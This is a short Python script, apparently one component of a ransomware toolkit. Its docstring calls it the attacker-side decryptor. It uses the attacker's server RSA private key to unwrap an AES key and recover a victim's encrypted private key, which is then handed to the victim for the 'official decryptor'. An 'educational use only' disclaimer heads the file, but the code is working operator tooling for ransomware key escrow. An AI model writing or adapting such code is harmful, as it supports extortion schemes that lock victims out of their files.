#!/usr/bin/env python3
"""
----------------------------------------------------------------------------
Client Key Decryptor @4quarks
----------------------------------------------------------------------------
Summary:
This script uses the attacker's (server) RSA private key to decrypt the 
victim's RSA private key. That PEM private key can be shared with the victim 
for decrypting their files using the official decryptor.

Warning:
- This code is for educational and authorized use only. Do not use on 
  systems you do not own or have explicit permission to operate on.
"""

import argparse
from pathlib import Path
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.asymmetric import padding as rsa_padding
from cryptography.hazmat.primitives import serialization, hashes, padding as sym_padding
from cryptography.hazmat.backends import default_backend

# Load server's private RSA key (PEM)
def load_server_private_key(path, password):
    with open(path, "rb") as f:
        return serialization.load_pem_private_key(f.read(), password=password, backend=default_backend())

# Decrypt the AES key, then decrypt the client private key using AES-CBC
def decrypt_client_key(enc_file, server_key, out_file):
    enc_data = Path(enc_file).read_bytes()

    iv = enc_data[:16]
    enc_aes_key = enc_data[16:272]
    encrypted_client_key = enc_data[272:]

    # Decrypt AES key using RSA private key
    aes_key = server_key.decrypt(
        enc_aes_key,
        rsa_padding.OAEP(
            mgf=rsa_padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    # Decrypt client key with AES-CBC
    cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    padded_key = decryptor.update(encrypted_client_key) + decryptor.finalize()

    unpadder = sym_padding.PKCS7(128).unpadder()
    client_key_pem = unpadder.update(padded_key) + unpadder.finalize()

    Path(out_file).write_bytes(client_key_pem)
    print(f"Decrypted client key saved to: {out_file}")

def main():
    parser = argparse.ArgumentParser(description="Attacker-side decryptor for client_privkey.encrypted")
    parser.add_argument("--server-key", required=True, help="Server private RSA key (PEM)")
    parser.add_argument("--encrypted-key", default="client_privkey.encrypted", help="Path to encrypted client key")
    parser.add_argument("--out", default="client_privkey.pem", help="Output decrypted client key")
    parser.add_argument("--pwd", default=None, help="Password for private key (if any)")

    args = parser.parse_args()
    server_key = load_server_private_key(args.server_key, args.pwd.encode() if args.pwd else None)
    decrypt_client_key(args.encrypted_key, server_key, args.out)

if __name__ == "__main__":
    main()

